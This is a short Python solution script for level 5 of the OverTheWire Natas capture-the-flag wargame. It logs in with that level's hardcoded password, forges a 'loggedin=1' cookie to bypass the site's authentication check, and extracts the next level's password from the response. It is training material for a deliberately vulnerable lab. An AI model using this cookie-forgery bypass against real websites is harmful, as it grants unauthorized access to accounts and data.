#!/usr/bin/env python3

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

cookies = { "loggedin" : "1" }

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.get(url, auth = (username, password), cookies = cookies)
content = response.text

print(re.findall('natas6 is (.*)</div>', content)[0])